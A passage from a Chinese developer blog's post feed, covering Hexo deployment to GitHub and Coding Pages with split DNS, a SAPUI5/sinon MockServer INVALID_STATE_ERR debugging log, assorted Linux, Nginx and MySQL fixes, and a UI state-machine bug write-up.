<pre><code># ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot;
</code></pre>
<p>一直回车就行，这个过程中有个环节要求输密码，建议留空，回车就行，否则每次提交代码还得输密码，违反了初衷。</p>
<pre><code># ls ~/.ssh
# id_rsa  id_rsa.pub
</code></pre>
<p>确保 ssh-key 生成成功后。进入下一步。</p>
<h3 id="GitHub-准备"><a href="#GitHub-准备" class="headerlink" title="GitHub 准备"></a>GitHub 准备</h3><ul>
<li><p>新建 GitHub 仓库，取名为<code>yourname.github.io</code>，注意<code>yourname</code>一定与当前登录的账号名保持一致，如图:</p>
<p>  <img src="/images/20170803/syncher-bin.png" alt="仓库名称"></p>
<p>  在浏览器中输入 <code>yourname.github.io</code> 能访问说明 Pages 服务开启成功，默认访问到仓库的介绍内容。</p>
</li>
<li><p>开启 Pages 服务，点击 <code>Settings</code>找到<code>GitHub Pages</code>–&gt;<code>Custom domain</code>自定义域名填写自己注册好的域名。GitHub 中添加自定义域名后会在仓库中新建一个名为 CNAME 的文件，文件内部保存了自定义域名。</p>
<p>  <img src="/images/20170803/github-pages.png" alt="仓库名称"></p>
<p>  在浏览器中输入 <code>yourname.github.io</code>顺利跳转到自定义域名说明自定义域名成功，继续下一步。</p>
<p>  <strong>【注意】</strong> 自定义域名后需要在 Hexo 的根目录下的 <code>source</code> 目录下新建一个 CNAME 文件，里面保存你的域名。否则提交的时候 Hexo 目录下没有 CNAME 所以 GitHub 仓库下的 CNMAE 文件会被认为是被删除，导致每次<code>hexo  d</code> 部署的时候 GitHub 下的自定义域名失效。Coding Pages 没有这种情况。</p>
</li>
<li><p>配置 ssh-key<br>  点击 GitHub 头像 –&gt; <code>Settings</code>:</p>
<p>  <img src="/images/20170803/click-setting.png" alt="设置 ssh-key"></p>
<p>  点击左侧导航中的 <code>SSH and GPG keys</code> 选择 <code>New SSH key</code>，<code>title</code>随便填，把之前生成的公钥内容复制到 <code>key</code>下，即<code>~/.ssh</code>下的 id_rsa.pub 文件中的内容复制到 <code>key</code>中然后<code>Add SSH key</code>。</p>
</li>
</ul>
<h3 id="Coding-准备"><a href="#Coding-准备" class="headerlink" title="Coding 准备"></a>Coding 准备</h3><ul>
<li><p>新建 Coding Pages 仓库，取名和刚才建的 GitHub 仓库类似，<code>yourname.coding.me</code>,注意<code>yourname</code>一定与当前登录的账号名保持一致，如图:</p>
<p>  <img src="/images/20170803/gbin.png" alt="仓库名称"></p>
</li>
<li><p>点击导航中的 <code>Pages 服务</code>，<code>部署来源</code>选择<code>master</code>。在仓库中新建文件 index.html，写入<code>hello word </code>之类的测试内容。在浏览器中输入 <code>yourname.coding.me</code> 输出内容说明 Pages 服务开启成功。</p>
</li>
<li><p>自定义域名，点击导航中的 <code>Pages 服务</code>，<code>自定义域名</code>中绑定自己的域名。</p>
<p>  !<img src="/images/20170803/coding-pages.png" alt="仓库名称"></p>
<p>  在浏览器中输入 <code>yourname.coding.me</code>顺利跳转到自定义域名说明自定义域名成功，继续下一步。</p>
</li>
<li><p>配置 ssh-key<br>  Coding 的 ssh-key 配置和 GitHub 相似。 点击 Coding 头像 –&gt; <code>个人设置</code>，<br>  点击左侧导航中的 <code>SSH 公钥</code> 添加即可。</p>
</li>
</ul>
<h3 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h3><p>回到 Hexo 站点目录，修改站点配置文件<code>_config.yml</code>。</p>
<p>**【注意】**配置文件有两个，一个叫主题配置文件在<code>themes/_config.yml</code>，另一个叫站点配置文件，在站点根目录下。</p>
<p>打开<code>_config.yml</code>找到<code>deploy:</code>修改为如下内容：</p>
<pre><code>deploy:
  type: git
  repo:
    github: git@github.com:syncher-bin/syncher-bin.github.io.git
    coding: git@git.coding.net:gbin/gbin.coding.me.git
  branch: master
</code></pre>
<p>其中 <code>git@github.com:syncher-bin/syncher-bin.github.io.git</code>和<code>git@git.coding.net:gbin/gbin.coding.me.git</code> 分别为 GitHub 和 Coding 的仓库地址，因为配置好了 ssh-key ，所以请选择 SSH 仓库地址。</p>
<p><strong>【注意】</strong> deploy 的值之 Hexo 版本是这样写的：</p>
<pre><code>deploy:
  type: git
  repo:
        github: git@github.com:syncher-bin/syncher-bin.github.io.git, master
        coding: git@git.coding.net:gbin/gbin.coding.me.git, master
</code></pre>
<p>但这样写会报错：</p>
<pre><code>FATAL fatal: remote part of refspec is not a valid name in HEAD: master
</code></pre>
<h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>以上配置好后切换到 Hexo 站点目录，执行：</p>
<pre><code># hexo g
# hexo s --debug
</code></pre>
<p>确保本地正常后发布：</p>
<pre><code># hexo d
</code></pre>
<h2 id="开启双线部署"><a href="#开启双线部署" class="headerlink" title="开启双线部署"></a>开启双线部署</h2><p>经历以上步骤是不是可以通过域名访问了呢，答案是否定的，因为域名还没有解析到正确的地址上。双线部署是国内请求 Coding Pages 国外请求 GitHub，因此要为域名设置解析路线，因为 Godaddy 不支持自定义解析路线，因此选择免费的 <a href="https://www.dnspod.cn/">DNSPod</a> 做 DNS 解析。</p>
<h3 id="DNS-解析配置"><a href="#DNS-解析配置" class="headerlink" title="DNS 解析配置"></a>DNS 解析配置</h3><ul>
<li><p>注册并登陆到 DNSPod，在控制台中选择添加域名，之后会检测域名的解析状态，如果有解析记录选择导入。</p>
<p>  <img src="/images/20170803/dnspod.png" alt="导入解析记录"></p>
</li>
<li><p>用 DNSPod 提供的 DNS 服务器地址替换 Godaddy 的 DNS 服务器。</p>
<p>  <img src="/images/20170803/dnspod-dns.png" alt="导入解析记录"></p>
<p>  登陆 Godaddy，选择<code>域名管理</code>点击域名左上角的设置，选择管理<code>DNS</code>，在域名服务器中用 f1g1ns1.dnspod.net 和 f1g1ns2.dnspod.net 替换原来的服务器。</p>
<p>  <img src="/images/20170803/change-dns.png" alt="导入解析记录"></p>
</li>
</ul>
<h3 id="开启-Coding-Pages-中的-HTTPS"><a href="#开启-Coding-Pages-中的-HTTPS" class="headerlink" title="开启 Coding Pages 中的 HTTPS"></a>开启 Coding Pages 中的 HTTPS</h3><ul>
<li><p>切换到 DNSPod 中添加 3 条解析记录。</p>
<pre><code>  * CNAME 默认 xxx.coding.me  600
  CNAME 默认 xxx.coding.me  600
  @ A 默认 103.72.145.7 600
</code></pre>
<p>  其中 103.72.145.7 是 ping xxx.coding.me 得到的 IP，CNAME 为域名的别名，指向 Coding 仓库。</p>
</li>
</ul>
<p>**【注意】**申请证书时，解析路线必须选择默认，否则 SSL&#x2F;TSL 证书会申请失败，如<a href="https://coding.net/u/coding/p/Coding-Feedback/topic/354603">https://coding.net/u/coding/p/Coding-Feedback/topic/354603</a></p>
<ul>
<li>切换到 Coding 仓库中，点击 Pages 服务，选择<code>强制 HTTPS 访问</code>，点击<code>申请</code>。如果配置成功，10分钟之内即可申请下来。</li>
</ul>
<h3 id="开启双线部署的最后一步"><a href="#开启双线部署的最后一步" class="headerlink" title="开启双线部署的最后一步"></a>开启双线部署的最后一步</h3><p>切换到 DNSPod ，更改解析记录。</p>
<ul>
<li><p>添加 GitHub 解析记录，新增 4 条解析记录。</p>
<pre><code>   @    A   国外 192.30.252.153         - - 600

   @    A   国外 192.30.252.154         - - 600

  www CNAME 国外 syncher-bin.github.io  - - 600
</code></pre>
<p>  其中 192.30.252.153 和 192.30.252.154 有 <a href="https://help.github.com/articles/troubleshooting-custom-domains/">GitHub 提供</a>。CNAME 指向 <a href="syncher-bin.github.io">syncher-bin.github.io</a></p>
</li>
<li><p>更改 Coding Page 解析记录。将线路类型改为国内即可。最终设置如下：</p>
<p>  <img src="/images/20170803/dns-setting.png" alt="导入解析记录"></p>
<p>  红色框与 GitHub 相关， 蓝色框与 Coding 相关。</p>
</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用 <a href="https://www.17ce.com/">17ce</a> 测试一下，你会发现国内访问响应服务器为 Coding 提过的 IP, 国外访问响应的服务器为 GitHub 提供的 IP，至此双线部署完毕。</p>
<p><img src="/images/20170803/test.png" alt="导入解析记录"></p>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢开源社区的开发者和贡献者。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><p><a href="https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/">https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Coding</tag>
      </tags>
  </entry>
  <entry>
    <title>INVALID_STATE_ERR Debug 记录</title>
    <url>/experience/debugging/dev-invalid-state-error-debug-log/</url>
    <content><![CDATA[<p>项目前端使用 SAPUI5 开发，运行集成测试时，所有的 AJAX 请求都会被 Mock。今天遇到一个问题，一些 URL 改动后集成测试运行失败， 报错信息如下：  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Uncaught Error: INVALID_STATE_ERR - 4</span><br><span class="line">    at k (sinon.js:184)</span><br><span class="line">    at F.setResponseHeaders (sinon.js:184)</span><br><span class="line">    at F.respond (sinon.js:184)</span><br><span class="line">    at F.window.sinon.FakeXMLHttpRequest.respondJSON (MockServer-dbg.js:3834)</span><br><span class="line">    at mockserver.js:298</span><br><span class="line">    at Array.some (&lt;anonymous&gt;)</span><br><span class="line">    at Object.response (mockserver.js:284)</span><br><span class="line">    at F.b (sinon.js:196)</span><br><span class="line">    at F.processRequest (sinon.js:196)</span><br><span class="line">    at F.respond (sinon.js:196)</span><br></pre></td></tr></table></figure>

<p>本文记录了该错误的排查过程，方便今后查阅。</p>
<span id="more"></span>

<p>尝试 Google Search，关键词 <code>INVALID_STATE_ERR</code>，只搜到一些不是很相关的答案</p>
<ul>
<li><a href="https://blogs.sap.com/2016/11/17/opa5-testing-with-json-backend/">https://blogs.sap.com/2016/11/17/opa5-testing-with-json-backend/</a></li>
<li><a href="https://github.com/sinonjs/sinon/issues/493">https://github.com/sinonjs/sinon/issues/493</a></li>
</ul>
<p>转化思路 - Bug 是发生在 SAPUI5 的 MockServer 中，由于我对 MockServer 并不了解，因此我决定深入一下  MockServer</p>
<h3 id="查阅-API-文档"><a href="#查阅-API-文档" class="headerlink" title="查阅 API 文档"></a>查阅 API 文档</h3><p>打开 SAPUI5 API 文档，找到 <a href="https://sapui5.hana.ondemand.com/#/api/sap.ui.core.util.MockServer">MockServer</a>， 这个对象继承自 ManagedObject，至于 ManagedObject 是干嘛的我目前还不太清楚，但是我决定先跳过这个细节。</p>
<p>MockServer 用来 Mock HTTP 请求。往下看 <code>Constructor</code> 用于创建一个 mocked server，可以 Mock XHR 和 OData&#x2F;JSON Models。虽然我对 OData 还不是很懂，但是这应该与这个 BUG 关系不大，所以我跳过这个细节。Constructor 接受一些配置参数，</p>
<ul>
<li><code>rootUri</code> </li>
<li><code>requests</code></li>
<li><code>recordRequests</code></li>
</ul>
<p>rootUri 是根路径，具体怎么用暂时比较模糊，稍后通过查阅源码来确定。requests 是一个数组，存放了被 mock 的请求（大致理解，稍后确认）。至于 recordRequests 是请求性能分析相关的，暂时忽略。</p>
<p>基于以上理解，一个 MockServer demo 如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> aReqs = [];</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> add mocked requests</span></span><br><span class="line"><span class="keyword">var</span> oMockServer = <span class="keyword">new</span> <span class="title class_">MockServer</span>(&#123;</span><br><span class="line">    <span class="attr">rootUri</span>: <span class="string">&#x27;./&#x27;</span>,</span><br><span class="line">    <span class="attr">requests</span>: aReqs</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">oMockServer.<span class="title function_">start</span>();</span><br></pre></td></tr></table></figure>

<p>继续阅读 API 文档，Events 部分暂时跳过，来到 Methods 部分，项目中使用到了 <a href="https://sapui5.hana.ondemand.com/api/sap.ui.core.util.MockServer#methods/sap.ui.core.util.MockServer.config">sap.ui.core.util.MockServer.config</a> 方法，该方法接受一个配置对象，其中几个属性如下：</p>
<ul>
<li>autoRespond</li>
<li>autoRespondAfter</li>
<li>fakeHTTPMethod</li>
</ul>
<p>项目中的配置是 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">autoRespond</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">autoRespondAfter</span>: (oUriParameters.<span class="title function_">get</span>(<span class="string">&quot;serverDelay&quot;</span>) </span><br><span class="line">    || <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (<span class="number">1501</span> - <span class="number">200</span>) + <span class="number">200</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并有注释说明，autoRespondAfter 加随机数是用于模拟真实环境的网络时延，其中 <code>oUriParameters</code> 如下定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oUriParameters = <span class="keyword">new</span> <span class="title class_">UriParameters</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>);</span><br></pre></td></tr></table></figure>



<h3 id="看个-Demo"><a href="#看个-Demo" class="headerlink" title="看个 Demo"></a>看个 Demo</h3><p>看完文档，还是比较模糊，下一步我需要看个 Demo，本来我可以直接看项目中的 MockServer，只不过项目中的 MockServer 是比较复杂的，不利于理解。</p>
<p>根据<a href="https://sapui5.hana.ondemand.com/#/topic/bae9d90d2e9c4206889368f04edab508">官方 Demo</a> 画了个流程图，</p>
<p><img src="/images/2020-05/mockserver-start-up.png"></p>
<p>其中用到了 simulate 的方法。</p>
<h3 id="深入源码"><a href="#深入源码" class="headerlink" title="深入源码"></a>深入源码</h3><p>至此，我对 MockServer 有了一知半解，但是我还不知道 <code>rootUri</code>, <code>requests</code> 和 <code>autoRespond</code> 的具体逻辑，所以我决定去看看 MockServer 的源码。克隆 openui5</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/SAP/openui5.git</span></span><br></pre></td></tr></table></figure>

<p>找到 <code>src/sap.ui.core/src/sap/ui/core/util/MockServer.js</code> </p>
<p>从 start 方法开始分析， 我们可以发现 start 方法会调 <code>sinon.fakeServer.create</code> 创建一个 FakeServer，然后再注册 mocked requests. 所以接下来我需要了解一下 sinon.fakeServer.</p>
<p><img src="/images/2020-05/mockserver-start.png"></p>
<p>打开 sinon API 文档，找到<a href="https://sinonjs.org/releases/latest/fake-xhr-and-server/">FakeServer</a>，使用很简单，直接看如下 demo，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">setUp</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">server</span> = sinon.<span class="title function_">createFakeServer</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">tearDown</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">server</span>.<span class="title function_">restore</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;test should fetch comments from server&quot;</span> : <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">server</span>.<span class="title function_">respondWith</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/some/article/comments.json&quot;</span>,</span><br><span class="line">            [<span class="number">200</span>, &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span><br><span class="line">             <span class="string">&#x27;[&#123; &quot;id&quot;: 12, &quot;comment&quot;: &quot;Hey there&quot; &#125;]&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> callback = sinon.<span class="title function_">spy</span>();</span><br><span class="line">        myLib.<span class="title function_">getCommentsFor</span>(<span class="string">&quot;/some/article&quot;</span>, callback);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">server</span>.<span class="title function_">respond</span>();</span><br><span class="line"></span><br><span class="line">        sinon.<span class="property">assert</span>.<span class="title function_">calledWith</span>(callback, [&#123; <span class="attr">id</span>: <span class="number">12</span>, <span class="attr">comment</span>: <span class="string">&quot;Hey there&quot;</span> &#125;]);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">assert</span>(server.<span class="property">requests</span>.<span class="property">length</span> &gt; <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中两个 <code>respondWith</code> 和 <code>respond</code> 这两个方法需要我重点关注。回到 <code>MockServer.js</code> 的源码发现，<code>_addRequestHanlder</code> 方法最终调用 <code>respondWith</code> (3446 行附近)，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">_oServer</span>.<span class="title function_">respondWith</span>(sMethod, oRegExp, fnResponse);</span><br></pre></td></tr></table></figure>

<p>从 API 文档得知，正则匹配到的 HTTP 方法将调用 <code>fnResponse</code>，由该方法手动处理响应。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">respondWith</span>(<span class="string">&quot;GET&quot;</span>, <span class="regexp">/\/todo-items\/(\d+)/</span>, <span class="keyword">function</span> (<span class="params">xhr, id</span>) &#123;</span><br><span class="line">    xhr.<span class="title function_">respond</span>(<span class="number">200</span>, &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;, <span class="string">&#x27;[&#123; &quot;id&quot;: &#x27;</span> + id + <span class="string">&quot; &#125;]&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>When the response is a <code>Function</code>, it will be passed the request object. You must manually call <a href="https://sinonjs.org/releases/latest/fake-xhr-and-server/#serverrespond">respond</a> on it to complete the request.</p>
</blockquote>
<p>文档还说，如果 <code>respondeWith</code> 中传递的<code>response</code>是一个回调函数，那么执行回调时会传递 xhr 对象，并且需要回调手动调用 <code>xhr.respond</code> 方法发动响应。</p>
<p>现在，回头看项目中的 MockServer 的代码，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> aReqs = [];</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> add mocked requests</span></span><br><span class="line"><span class="keyword">var</span> oMockServer = <span class="keyword">new</span> <span class="title class_">MockServer</span>(&#123;</span><br><span class="line">    <span class="attr">rootUri</span>: <span class="string">&#x27;./&#x27;</span>,</span><br><span class="line">    <span class="attr">requests</span>: aReqs</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">oMockServer.<span class="title function_">start</span>();</span><br></pre></td></tr></table></figure>

<p>其中还有一个循环将所有的 request 添加到 aReqs 中，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">aReqs.<span class="title function_">push</span>(<span class="title function_">createRequest</span>(data));</span><br></pre></td></tr></table></figure>

<p>再看 <code>createRequest(data)</code> 方法，该方法返回一个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createRequest</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> oRequest = &#123;</span><br><span class="line">        <span class="comment">// ... some code here</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> oRequest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个对象被 <code>MockerServer.js</code> 的 start 方法消费，看源码</p>
<p><img src="/images/2020-05/mockserver-start-1.png"></p>
<p>该对象提供了 <code>respondWith</code> 中需要的三个参数，即 method, path 和 response。</p>
<p>至此， 我已经看懂了整个 MockServer 的过程了，再回头看错误信息，</p>
<p><img src="/images/2020-05/error-info.png"></p>
<h3 id="看懂错误信息"><a href="#看懂错误信息" class="headerlink" title="看懂错误信息"></a>看懂错误信息</h3><p>错误由 XMLHttpRequest 对象引起，因此需要查阅 XHR 的 <a href="https://www.w3.org/TR/XMLHttpRequest1/">API 文档</a>，搜索关键词 <code>INVALID_STATE_ERR</code> 共发现 8 处，</p>
<blockquote>
<p>Throws an <code>INVALID_STATE_ERR</code> exception if the state is not <a href="https://www.w3.org/TR/XMLHttpRequest1/#dom-xmlhttprequest-opened">OPENED</a> or if the <a href="https://www.w3.org/TR/XMLHttpRequest1/#send-flag"><code>send()</code> flag</a> is true.</p>
</blockquote>
<p>也就是说如果 XHR 的状态如果是 not opend 或者是已经 send 后的状态，那么就会抛出该异常。</p>
<p>结合错误信息给出的函数调用栈很容易定位出该错误发生在 <code>setRespinseHeaders</code> 之后，打开 sinon 源码去看 setResponseHeader 的实现，发现有个 verifyRequestOpend 方法。</p>
<p><img src="/images/2020-05/set-response-headers.png"></p>
<p>再进入 verifyRequestOpend 方法一看，果然是从这里抛出的异常，异常原因就是 xhr 的状态已经变成 4 了，4 代表 DONE，详细状态参考<a href="https://www.w3.org/TR/XMLHttpRequest1/#dom-xmlhttprequest-done">这里</a>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">verifyRequestOpened</span>(<span class="params">xhr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> != <span class="title class_">FakeXMLHttpRequest</span>.<span class="property">OPENED</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;INVALID_STATE_ERR - &quot;</span> + xhr.<span class="property">readyState</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明 298 行执行 <code>xhr.resondJSON</code> 之前已经执行过 <code>xhr.send</code> 方法了。</p>
<h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>基于以上理解，打断点追踪一下就很容易发现代码逻辑有问题了（当然，这个代码不是本人写的，甩锅……）。</p>
<p>以上，记录一次 Debug 的过程。</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>XHR</tag>
      </tags>
  </entry>
  <entry>
    <title>零散 bug 记录</title>
    <url>/experience/debugging/linux-debug/</url>
    <content><![CDATA[<p>本文记录日常工作、学习、生活中遇到的 BUG！</p>
<span id="more"></span>

<h2 id="Linux-相关"><a href="#Linux-相关" class="headerlink" title="Linux 相关"></a>Linux 相关</h2><ol>
<li><p>deepin 搜狗输入法顿号输入 BUG，解决详见：<a href="https://bbs.deepin.org/forum.php?mod=viewthread&tid=36369">https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=36369</a></p>
</li>
<li><p>git push 到 GitHub 警告</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added the RSA host key for IP address</span><br></pre></td></tr></table></figure>

<p> 解决详见：<a href="https://stackoverflow.com/questions/18711794/warning-permanently-added-the-rsa-host-key-for-ip-address">https://stackoverflow.com/questions/18711794/warning-permanently-added-the-rsa-host-key-for-ip-address</a></p>
</li>
<li><p>deepin 下 Lantern 启动错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Running installation script...</span><br><span class="line">/usr/lib/lantern/lantern-binary: 成功</span><br><span class="line">/home/gbin/.lantern/bin/lantern: error while loading shared libraries: libappindicator3.so.1:</span><br><span class="line">open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>

<p>Install the <code>libappindicator3</code>,see <a href="https://github.com/getlantern/lantern/issues/5118">issue</a></p>
<ul>
<li>step 1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  apt-cache search libappindicator3  gir1.2-appindicator3-0.1 - Typelib fi</span><br><span class="line">gir1.2-appindicator3-0.1 - Typelib files for libappindicator3-1</span><br></pre></td></tr></table></figure>

<ul>
<li>step 2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y libappindicator3-1</span><br></pre></td></tr></table></figure>

<p>done!</p>
</li>
<li><p>Nginx 报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nginx: nginx: [warn] load balancing method redefined</span><br></pre></td></tr></table></figure>

<p>You can mix <code>keepalive</code> and <code>least_conn</code>, but you should define <code>least_conn</code> <em>before</em> <code>keepalive</code></p>
<p><a href="https://ma.ttias.be/nginx-nginx-warn-load-balancing-method-redefined/">https://ma.ttias.be/nginx-nginx-warn-load-balancing-method-redefined/</a></p>
</li>
</ol>
<h2 id="MySQL-相关"><a href="#MySQL-相关" class="headerlink" title="MySQL  相关"></a>MySQL  相关</h2><ol>
<li><p>column xx in field list is ambiguous，一般在 join 的时候出现字段模糊，字段前添加表名即可。</p>
<p>如下报错：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_id,</span><br><span class="line">       presentation</span><br><span class="line"><span class="keyword">FROM</span> Variant</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> productCategory <span class="keyword">ON</span> product_id <span class="operator">=</span> product_id</span><br><span class="line">LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>改为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">   Variant.product_id, </span><br><span class="line">   presentation</span><br><span class="line"><span class="keyword">FROM</span> Variant </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> productCategory </span><br><span class="line"><span class="keyword">ON</span> productCategory.product_id <span class="operator">=</span> Variant.product_id </span><br><span class="line">LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>​</p>
<p>​</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>BUG</tag>
      </tags>
  </entry>
  <entry>
    <title>一按钮不正常显示的 Debug 记录</title>
    <url>/experience/debugging/dev-show-less-is-not-disappearing-debugging/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>如图有一个容器中有三个 Tile，如下定义容器的三种显示状态：三个 Tile 可以并列显示在一排时的状态为 Normal；当三个 Tile 无法一排显示在一排，其中有一个或者两个 Tile 处于 Overflow 的状态为 Collapsed；三个 Tile 显示在多排的状态为 Expanded。<br><img src="/images/2020-09/tile-group-three-layouts.png"><br>处于 Collapsed 状态时，可以点击 Show more 变到 Expanded 状态，同理处于 Expanded 状态时点击 Show less 可以变回 Collapsed 状态。拖动窗口大小时可以从 Expanded&#x2F;Collapsed 到 Normal 状态下相互转化。<br><strong>Bug 是：从 Expanded 变至 Normal 时，Show less 不应该显示</strong>。</p>
<p><img src="/images/2020-09/show-less-does-not-work.png"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>通过上述的分析，显然这是一个<a href="https://zh.wikipedia.org/zh-hans/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BA">有限元状态机</a>问题，该问题总共有如下三种状态，Collapsed 和 Expanded 之间通过 Show more &#x2F; Show less 相互转换，Collapsed&#x2F;Expanded 和 Normal 之间通过 Resizing 相互转换。<br><img src="/images/2020-09/tile-group-state-machine.png"></p>
<p>分析代码逻辑发现，Show more &#x2F; Show less 按钮是通过一个 <code>expandable</code> 状态控制的，但是代码的作者忽略了 Expanded 到 Normal 的状态转换，从而导致这种转换发生时 <code>expandable</code> 状态没有被更新。解决这个问题总共使用了不到两个小时，用了 4 个番茄时钟，其中两个 3 个时钟花在了梳理原来的逻辑上，逻辑梳理清楚后分析处这是一个状态机问题，后面修复就简单了。<br><img src="/images/2020-09/task-overview.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本来这并不是一个特别头疼的 Bug，也不足以记录，但是经过分析之后其背后隐藏着一个状态机模型。这种发现是对重视理论基础，特别是重视算法的程序员的馈赠，至少我很享受这种发现所带来的乐趣。其实编程的本质还是抽象，抽象的基础是建模，建模的基础那就是数据结构和算法了。<br>综上述，我们应该坚持学习算法和数据结构。<br>其实就是找个继续刷算法的理由罢了，本文完(又水了一篇:狗头!</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>最后附上一些关于状态机的资料和几道 LeetCode 题目：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Finite-state_machine">https://en.wikipedia.org/wiki/Finite-state_machine</a></li>
<li><a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/">https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/</a></li>
<li><a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/">https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/</a></li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>XHR</tag>
      </tags>
  </entry>
  <entry>
    <title>Demystifying Advanced HTTP 1.1</title>
    <url>/experience/practice/demysifying-advanced-http/</url>
